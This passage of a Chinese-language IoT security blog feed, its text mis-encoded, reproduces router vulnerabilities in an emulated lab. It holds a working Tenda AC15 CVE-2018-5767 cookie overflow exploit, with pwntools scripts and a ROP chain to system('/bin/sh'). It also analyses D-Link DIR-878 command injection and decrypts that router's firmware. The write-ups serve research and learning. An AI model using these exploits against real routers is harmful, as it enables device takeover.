&#123;&quot;Cookir&quot;:&quot;password=&quot;+cyclic(600)&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line">print ret.text</span><br></pre></td></tr></table></figure><p><code>gdb-nultiarch</code>çœ‹åˆ°é”™è¯¯å¹¶æ²¡æœ‰è·³åˆ°æˆ‘ä»¬æœŸæœ›çš„éšæœºåœ°å€ï¼Œæ‰€ä»¥è·Ÿè¸ªé”™è¯¯ï¼ŒæŸ¥çœ‹åŸå› </p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15overflowBT.png" alt></p><p>å¯ä»¥çœ‹å‡ºï¼Œç¨‹åºæ‰§è¡Œæµç¨‹ä¸­ï¼Œæ‰§è¡Œåˆ°äº†<code>ldrb  ip, [r3]</code>ï¼Œä¼šå°†å­˜å‚¨åœ°å€ä¸ºR3çš„å­—èŠ‚æ•°æ®è¯»å…¥IPï¼Œè€Œæ­¤æ—¶çš„R3ä¸º<code>0x6561616e</code>ï¼Œè¿™ä¸ªåœ°å€æ˜¯éæ³•çš„ï¼Œæ— æ³•è®¿é—®è¯¥åœ°å€å†…çš„æ•°æ®å¡«å…¥IPã€‚</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†è¯¥åœ°å€è®¾ç½®æˆåˆæ³•åœ°å€ï¼ˆæ¯”å¦‚<code>0x2CEA8</code>ï¼Œæ­¤å¤„æœ‰æ˜¾è‘—æ‰“å°<code>****** WeLoveLinux******</code>ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l naae</span><br><span class="line">452</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥è®¾ç½®<code>&quot;password=&quot; + cyclic(452) + p32(0x2CEA8) + &quot;B&quot;*100</code>ï¼Œæµ‹è¯•äº†ä¸€ä¸‹GGäº†ã€‚</p><p>è¿™ä¸ªåç§»ä¸å¯¹å•Šï¼Ÿå†æ¬¡æµ‹è¯•çš„æ—¶å€™ï¼Œåç§»å°±å˜æˆäº†<strong>448</strong>ï¼Œå…¶å®æŒ‰ç…§<code>char v34[128]; // [sp+304h] [bp-1C0h] BYREF</code>çš„å¤§å°ä¹Ÿåº”è¯¥æ˜¯448ï¼Œæ‰€ä»¥å†æ¬¡ä¿®æ”¹<code>&quot;password=&quot; + cyclic(448) + p32(0x2CEA8) + &quot;B&quot;*100</code>ï¼Œgdbä¸­PCå¯„å­˜å™¨å·²è¢«ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„ç›®æ ‡åœ°å€<code>0x2CEA8</code></p><p>è¿™æ¬¡ç¨‹åºå¼€å§‹æŒç»­åˆ·æ–°<code>0x2CEA8</code>å¤„å†…å®¹ï¼ŒæˆåŠŸåˆ©ç”¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15RefreshWeloveLinux.png" alt></p><p>ç”±äºå¼€å¯äº†NXï¼Œæ‰€ä»¥ä¸èƒ½è¿”å›shellcodeäº†ã€‚</p><p>è€ƒè™‘ä½¿ç”¨gadgetæ§åˆ¶R0ï¼Œå†è·³è½¬åˆ°systemå‡½æ•°ï¼Œä»è€Œæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0003B0F4                 MOV             R0, R3  ; command</span><br><span class="line">.text:0003B0F8                 BL              system</span><br></pre></td></tr></table></figure><p>åœ¨ä»£ç æ®µä¸­æ‰¾åˆ°ä¸€æ¡åˆé€‚çš„ï¼Œä½†æ˜¯ç”±äºå‚æ•°æ˜¯ç”±<code>R3-&gt;R0</code>ï¼Œè¿˜æ˜¯ä¸æ–¹ä¾¿æ§åˆ¶å‚æ•°ï¼Œæƒ³æƒ³è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•..</p><hr><p>ç»§ç»­çœ‹idaä¸­ï¼Œæ ¹æ®gdbæŠ¥é”™åœ°å€<code>0x2c5cc</code>ï¼Œå›æº¯å‘ç°æ˜¯ç”±äºè¯»å–passwordåè¿›å…¥äº†if</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">...</span><br><span class="line">if ( strlen(s) &lt;= 3</span><br><span class="line">      || (v43 = strchr(s, &apos;.&apos;)) == 0</span><br><span class="line">      || (v43 = (char *)v43 + 1, memcmp(v43, &quot;gif&quot;, 3u))</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;png&quot;, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;js&quot;, 2u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;css&quot;, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;jpg&quot;, 3u)</span><br><span class="line">      &amp;&amp; memcmp(v43, &quot;jpeg&quot;, 3u) )</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ifçš„æ¡ä»¶æ˜¯<strong>é•¿åº¦&lt;=3 || ä¸å­˜åœ¨. || ä¸å­˜åœ¨jpg&amp;png&amp;jsâ€¦</strong>ï¼Œæ‰€ä»¥è·³å‡ºifçš„æ¡ä»¶æ˜¯<strong>é•¿åº¦&gt;3 &amp;&amp; å­˜åœ¨. &amp;&amp; å­˜åœ¨jpgæˆ–pngæˆ–jsâ€¦.</strong></p><p>æ‰€ä»¥æˆ‘ä»¬çš„passwordé‡Œéœ€è¦å­˜åœ¨.jpgå°±å¯ä»¥ç›´æ¥returnè¿”å›ï¼Œç›´æ¥æ§åˆ¶è¾“å…¥çš„passwordæ¥å¸ƒç½®å †æ ˆå°±å¥½äº†ã€‚ï¼ˆä¸»è¦æ˜¯ä¸å†™.jpgè¿™ç§ï¼Œå°±ä¼šè¿›å…¥æ‰§è¡Œå¾ˆå¤šä»£ç ï¼Œå¯¹å †æ ˆå¤§æ´—ç›˜ï¼Œä¸å¥½æ§åˆ¶ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># testPOC2</span><br><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.65.1&quot;</span><br><span class="line">url = &quot;http://%s/goform/execCommand&quot;%ip</span><br><span class="line">cookie = &#123;&quot;Cookir&quot;:&quot;password=&quot; + cyclic(444) + &quot;.jpg&quot; + p32(0x2CEA8) + &quot;B&quot;*100&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line">print ret.text</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ROPgadgetæŸ¥æ‰¾å¯ç”¨çš„gadgetï¼Œè€ƒè™‘ä½¿ç”¨æ ˆæ¥æ§åˆ¶R0ï¼Œæœ€å¥½æ§åˆ¶çš„å°±æ˜¯SPæ ˆé¡¶äº†ï¼Œæ°å¥½æ‰¾åˆ°äº†åˆé€‚çš„gadgetï¼Œè¯¥gadgetä¼šå°†æ ˆé¡¶èµ‹å€¼ç»™R0ï¼Œè€ƒè™‘å°†æ ˆé¡¶è®¾ç½®ä¸º<code>/bin/sh</code>ï¼Œå¹¶è·³è½¬åˆ°R3ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libc.so.0 | grep &quot;mov r0, sp&quot;</span><br><span class="line">...</span><br><span class="line">0x00040cb8 : mov r0, sp ; blx r3</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ç»§ç»­å¯»æ‰¾å¯ä»¥æ§åˆ¶R3çš„gadgetï¼Œå°†R3è®¾ç½®ä¸º<code>system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./lib/libc.so.0 --only &quot;pop&quot;</span><br><span class="line">...</span><br><span class="line">0x00018298 : pop &#123;r3, pc&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>åœ¨gdbä¸­<code>vmmap</code>æŸ¥çœ‹libcåŸºå€ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªå‘ï¼Œé€šè¿‡è¯¥libcåŸºå€æ‰¾åˆ°çš„systemå‡½æ•°ï¼Œè™½ç„¶å¯ä»¥è¢«gdbè¯†åˆ«ä¸ºsystemï¼Œä½†æ˜¯å¹¶ä¸èƒ½å®ç°systemï¼Œè€Œgadgetæ˜¯å¯ç”¨çš„â€¦æ‰€ä»¥ç›´æ¥<code>p system</code>æ‰¾åˆ°å¯ç”¨systemåœ°å€</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">context.binary = &quot;./bin/httpd&quot;</span><br><span class="line">libc = ELF(&quot;./lib/libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.65.1&quot;</span><br><span class="line">url = &quot;http://%s/goform/test&quot;%ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = 0xff5d5000</span><br><span class="line"># sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">sys_addr = 0xff7460f4</span><br><span class="line">gadget2 = libc_base + 0x40cb8# 0x40cb8 ; mov r0, sp ; blx r3</span><br><span class="line">gadget1 = libc_base + 0x18298# 0x18298 : pop &#123;r3, pc&#125;</span><br><span class="line">success(&quot;gadget1 = &quot;+hex(gadget1))</span><br><span class="line">success(&quot;gadget2 = &quot;+hex(gadget2))</span><br><span class="line"># [+] gadget1 = 0xff5ed298</span><br><span class="line"># [+] gadget2 = 0xff615cb8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot; + cyclic(444) + &quot;.jpg&quot; + p32(gadget1, endian=&quot;little&quot;) + p32(sys_addr, endian=&quot;little&quot;) + p32(gadget2, endian=&quot;little&quot;) + &quot;/bin/sh\x00&quot;&#125;</span><br><span class="line"></span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line">print ret.text</span><br></pre></td></tr></table></figure><h1 id="å¾…"><a href="#å¾…" class="headerlink" title="å¾…"></a>å¾…</h1><h2 id="GoAhead"><a href="#GoAhead" class="headerlink" title="GoAhead"></a>GoAhead</h2><p>å…³äºè¿™ä¸ªGoAheadï¼Œå¯ä»¥ä¸‹è½½æºç <a href="https://github.com/Grant999/goahead-1ï¼Œç®€å•åˆ†æå‘ç°`websUrlHandlerDefine`è¿™ä¸ªå‡½æ•°ï¼Œå’Œè°ƒç”¨äº†æ¼æ´å‡½æ•°`R7WebsSecurityHandler`çš„å‡½æ•°å¾ˆç±»ä¼¼ï¼Œæ‰€ä»¥æ¨æ–­è¿™åº”è¯¥å°±æ˜¯ç”¨æˆ·äºŒæ¬¡å¼€å‘GoAheadä¸­çš„`websSecurityHandler`æˆ–è€…è‡ªå®šä¹‰çš„å‡½æ•°ã€‚" target="_blank" rel="noopener">https://github.com/Grant999/goahead-1ï¼Œç®€å•åˆ†æå‘ç°`websUrlHandlerDefine`è¿™ä¸ªå‡½æ•°ï¼Œå’Œè°ƒç”¨äº†æ¼æ´å‡½æ•°`R7WebsSecurityHandler`çš„å‡½æ•°å¾ˆç±»ä¼¼ï¼Œæ‰€ä»¥æ¨æ–­è¿™åº”è¯¥å°±æ˜¯ç”¨æˆ·äºŒæ¬¡å¼€å‘GoAheadä¸­çš„`websSecurityHandler`æˆ–è€…è‡ªå®šä¹‰çš„å‡½æ•°ã€‚</a></p><p>ä½†æ˜¯å…³äºè¿™é‡Œçš„ç»“æ„ä½“ç”±æ¥ï¼Œæˆ‘è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šâ€¦</p><h2 id="fuzz-1"><a href="#fuzz-1" class="headerlink" title="fuzz"></a>fuzz</h2><p>é¦–å…ˆæ˜¯fuzzç›¸å…³çŸ¥è¯†=æ— ï¼Œboofuzzçš„ä½¿ç”¨ä¹Ÿæ²¡æœ‰æŒæ¡ï¼Œå®˜æ–¹æ–‡æ¡£çœ‹èµ·æ¥ä¸å‹å¥½ï¼Œè¯­æ³•ä¸ä¼šâ€¦åªèƒ½çœ‹ç€åˆ«äººçš„è„šæœ¬ä¾è‘«èŠ¦ç”»ç“¢ã€‚</p><h2 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h2><p>æ¯æ¬¡åˆ†æç¨‹åºçš„æ—¶å€™è™½ç„¶å¯ä»¥å¤§æ¦‚ç†æ¸…æ¥šéœ€è¦ä»€ä¹ˆï¼Œä½†æ˜¯ä¸å¤Ÿ..æœæ–­ï¼Ÿåæ±‡ç¼–å’Œåç¼–è¯‘è¯»çš„å¤ªç¬¼ç»Ÿï¼Œè¿˜æœ‰ä¸€äº›å‡½æ•°çš„æŒæ¡ä¸åˆ°ä½ï¼ŒGG</p><p>åªåœ¨æµ‹è¯•äº†è§£åªæ˜¯ç”¨/goformæ˜¯ä¸èƒ½çš„ï¼Œæ¯”å¦‚è¦å†åŠ ä¸Šä¸€ä¸ªuri â€“&gt; /goform/xxxæ‰è¡Œ</p><blockquote><p>Reference:</p><p><a href="http://www.tearorca.top/index.php/2020/04/05/%E5%88%9D%E6%8E%A2boofuzz/#i-6" target="_blank" rel="noopener">http://www.tearorca.top/index.php/2020/04/05/%E5%88%9D%E6%8E%A2boofuzz/#i-6</a></p><p><a href="https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/" target="_blank" rel="noopener">https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/</a></p><p><a href="https://zhuanlan.zhihu.com/p/43432370" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/43432370</a></p><p><a href="https://blog.csdn.net/song_lee/article/details/104334096" target="_blank" rel="noopener">https://blog.csdn.net/song_lee/article/details/104334096</a></p><p><a href="https://blog.csdn.net/song_lee/article/details/113800058" target="_blank" rel="noopener">Tenda AC15 è·¯ç”±å™¨ CVE-2018-5767 / CVE-2020-10987 fuzz</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½±å“äº§å“ï¼šTenda AC15è·¯ç”±å™¨&lt;/p&gt;
&lt;p&gt;å½±å“ç‰ˆæœ¬ï¼š5767ï¼šV15.03.05.16 &amp;amp; 10987ï¼šV15.03.05.18&lt;/p&gt;
&lt;p&gt;å›ºä»¶ä¸‹è½½é“¾æ¥ï¼ˆV15.03.05.16ï¼‰ï¼š&lt;a href=&quot;https://down.tendacn.com/u</summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="è·¯ç”±å™¨" scheme="p1Kk.github.io/tags/è·¯ç”±å™¨/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
    <category term="fuzz" scheme="p1Kk.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>DLink DIR-878 CVE-2019-8316 å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆæ²¡ç¯å¢ƒ</title>
    <link href="p1Kk.github.io/2021/03/14/iot/DLink%20DIR-878%20CVE-2019-8316%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>p1Kk.github.io/2021/03/14/iot/DLink%20DIR-878%20CVE-2019-8316%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-03-13T16:00:00.000Z</published>
    <updated>2021-04-14T13:00:48.414Z</updated>
    
    <content type="html"><![CDATA[<p>å½±å“ç‰ˆæœ¬ï¼šv1.12ä¹‹å‰</p><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://tsd.dlink.com.tw/" target="_blank" rel="noopener">https://tsd.dlink.com.tw/</a>  é€‰æ‹©ä¸‹è½½DIR-878 v1.12 &amp; v1.04</p><p>æ¼æ´è¯¦æƒ…ï¼š<a href="https://www.seebug.org/vuldb/ssvid-97802" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97802</a></p><h1 id="å›ºä»¶æ¨¡æ‹Ÿ"><a href="#å›ºä»¶æ¨¡æ‹Ÿ" class="headerlink" title="å›ºä»¶æ¨¡æ‹Ÿ"></a>å›ºä»¶æ¨¡æ‹Ÿ</h1><h2 id="å›ºä»¶è§£åŒ…"><a href="#å›ºä»¶è§£åŒ…" class="headerlink" title="å›ºä»¶è§£åŒ…"></a>å›ºä»¶è§£åŒ…</h2><p>å’Œä»¥å‰çš„å›ºä»¶ç›´æ¥è§£åŒ…ä¸å¤ªä¸€æ ·ï¼Œv1.12æ˜¯åŠ å¯†äº†çš„å›ºä»¶ç‰ˆæœ¬ï¼Œè€Œä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œv1.10æ˜¯ç¬¬ä¸€ä¸ªåŠ å¯†çš„ç‰ˆæœ¬ä¸”v1.04è¿˜æœªåŠ å¯†ã€‚</p><p>è¿™ç§ç±»å‹å±äº<code>è®¾å¤‡å›ºä»¶å‡ºå‚æ—¶æœªåŠ å¯†ï¼Œä¹Ÿä¸åŒ…å«ä»»ä½•è§£å¯†ä¾‹ç¨‹ã€‚è§£å¯†ä¾‹ç¨‹ä¸å›ºä»¶çš„æœªåŠ å¯†ç‰ˆæœ¬(v1.04)ä¸€èµ·ä»¥æ›´é«˜ç‰ˆæœ¬(v1.10)ä¸€èµ·æä¾›ï¼Œä»¥ç”¨äºå°†æ¥çš„åŠ å¯†å›ºä»¶æ›´æ–°ï¼Œéšåçš„å›ºä»¶ç‰ˆæœ¬å°†è¢«åŠ å¯†</code>ã€‚åœ¨è¿™ä¸ªæ–¹æ¡ˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä»å›ºä»¶v1.04è·å–è§£å¯†ä¾‹ç¨‹ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥è§£å¯†æ–°çš„å›ºä»¶v1.12ç‰ˆæœ¬</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/v104110.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk DIR878A1_FW1.12B01_Encrypt.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># è¢«åŠ å¯†</span><br><span class="line">$ binwalk DIR878A1_FW104B05_Middle_FW_Unencrypt.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0xC41C48E6, created: 2018-02-03 10:12:31, image size: 10448690 bytes, Data Address: 0x81001000, Entry Point: 0x81611F40, data CRC: 0x64113D8A, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;Linux Kernel Image&quot;</span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 15907264 bytes</span><br><span class="line">68516         0x10BA4         MySQL MISAM index file Version 6</span><br><span class="line"></span><br><span class="line"># æœªåŠ å¯†</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR878A1_FW104B05_Middle_FW_Unencrypt.bin </span><br><span class="line">$ cd _DIR878A1_FW104B05_Middle_FW_Unencrypt.bin.extracted/_A0.extracted/_8AB758.extracted/cpio-root</span><br><span class="line"># è¿›å…¥äº†æ ¹ç›®å½•</span><br><span class="line">$ find ./ -name *crypt*</span><br><span class="line">...</span><br><span class="line">./bin/imgdecrypt</span><br><span class="line"># æ‰¾åˆ°äº†</span><br><span class="line">$ file ./bin/imgdecrypt </span><br><span class="line">./bin/imgdecrypt: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"># æ–‡ä»¶ä¸ºLSB å°ç«¯ mipsel</span><br><span class="line">$ cp $(which qemu-mipsel-static) ./</span><br><span class="line"># å°†DIR878A1_FW1.12B01_Encrypt.binç²˜è´´åˆ°æ ¹ç›®å½•åå†è§£å¯†ï¼Œå¦åˆ™æ— æ•ˆ</span><br><span class="line">$ sudo chroot ./ ./qemu-mipsel-static ./bin/imgdecrypt ./DIR878A1_FW1.12B01_Encrypt.bin</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br><span class="line"># è¾“å‡ºäº†key è§£å¯†æˆåŠŸï¼Œå†ç§»å›åˆ°åŸæ¥çš„ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR878A1_FW1.12B01_Encrypt.bin </span><br><span class="line"># ç„¶åä¸€æ ·çš„ åˆ°æ ¹ç›®å½•å»...</span><br></pre></td></tr></table></figure><h2 id="sys-modï¼ˆfailed"><a href="#sys-modï¼ˆfailed" class="headerlink" title="sys-modï¼ˆfailed"></a>sys-modï¼ˆfailed</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo guestmount -a debian_wheezy_mipsel_standard.qcow2 -m /dev/sda1 /mnt</span><br><span class="line"><span class="meta">$</span> sudo cp -rf ./cpio-root/ /mnt/root/</span><br><span class="line"><span class="meta">$</span> sudo guestunmount /mnt </span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> sudo tunctl -t tap0 -u `whoami`</span><br><span class="line"><span class="meta">$</span> sudo ifconfig tap0 192.168.65.1/24</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-5kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><p>ä¹Œé±¼å­â€¦æ¨¡æ‹Ÿä¸èµ·æ¥â€¦ğŸ˜­</p><p>åœ¨å…¬ç½‘ä¸Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯ç”¨çš„è·¯ç”±å™¨â€¦</p><p>ç›´æ¥åˆ†æå§â€¦</p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="ç›®æ ‡æ–‡ä»¶åˆ†æ"><a href="#ç›®æ ‡æ–‡ä»¶åˆ†æ" class="headerlink" title="ç›®æ ‡æ–‡ä»¶åˆ†æ"></a>ç›®æ ‡æ–‡ä»¶åˆ†æ</h2><p>æ ¹æ®æ¼æ´è¯¦æƒ…ï¼Œå®šä½åˆ°ç›®æ ‡æ–‡ä»¶<code>librcm.so</code>ä¸­çš„ç›®æ ‡å‡½æ•°<code>tw_add_url_filter_iptables_rule</code></p><p>å¯ä»¥å‘ç°å­˜åœ¨å‘½ä»¤æ³¨å…¥</p><p>æµç¨‹ä¸º<code>load_iptables -&gt; upload_url_filter_rules -&gt; tw_add_url_filter_iptables_rule &amp; tw_add_url_allow_filter_iptables_rule</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/878bugstart.png" alt></p><p>åœ¨twsystemå‡½æ•°ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/twsystem.png" alt></p><p>æŸ¥æ‰¾ä¸€ä¸‹ä¸Šé¢<code>tw_add_url_filter_iptables_rule</code>å¼•ç”¨å¤„ï¼Œæ³¨æ„åˆ°äº†ä¸‹é¢æœ‰ä¸€ä¸ªå·®ä¸å¤šçš„å‡½æ•°ï¼Œéƒ½ä¸€æ ·çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/878next.png" alt></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>åœ¨ç«™ç‚¹è¿‡æ»¤å¤„ï¼Œä¿®æ”¹<code>ç«™ç‚¹URL\åŸŸ</code>ï¼Œéœ€è¦æ³¨æ„urlçš„é¢„å¤„ç†è¿‡ç¨‹ï¼Œå‡½æ•°ä¼šæ ¹æ®/æ¥æˆªå–åŸŸåï¼Œæ‰€ä»¥ä¸è¦ç”¨/â€¦</p><p>å‰ç«¯æ— æ³•æ³¨å…¥ï¼Œä½¿ç”¨burpæŠ“åŒ…ä¿®æ”¹å³å¯ã€‚</p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p>åœ¨DIR-878è·¯ç”±å™¨ä¸­ï¼Œè¿˜æœ‰å¾ˆå¤šç±»ä¼¼çš„å‘½ä»¤æ³¨å…¥å¦‚CVE-2019-8317\8318\8319ï¼ˆæ¼æ´åœ¨<code>/bin/rc</code>ä¸­ï¼‰ï¼Œéƒ½æ˜¯ç”±<code>twsystem</code>å®Œæˆï¼Œç¨‹åºå¯¹å¾ˆå¤šè¾“å…¥å¹¶æ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–æ£€æµ‹ã€‚</p><p>ä»¥ååˆ†æè¦æ›´é€å½»æ‰è¡Œå“¦â€¦</p><blockquote><p>Reference</p><p><a href="https://www.heibai.org/post/1395.html" target="_blank" rel="noopener">D-Linkè·¯ç”±å™¨HNAPåè®®ç³»åˆ—æ¼æ´æŠ«éœ²</a></p><p><a href="https://github.com/lieanu/vuls/blob/master/dlink/DIR-878/webfilter.md" target="_blank" rel="noopener">https://github.com/lieanu/vuls/blob/master/dlink/DIR-878/webfilter.md</a></p><p><a href="https://mp.weixin.qq.com/s/CpT4gTAwYMCFqwTRxQBBkw" target="_blank" rel="noopener">è·¯ç”±å™¨åŠ å¯†å›ºä»¶çš„è§£å¯†</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½±å“ç‰ˆæœ¬ï¼šv1.12ä¹‹å‰&lt;/p&gt;
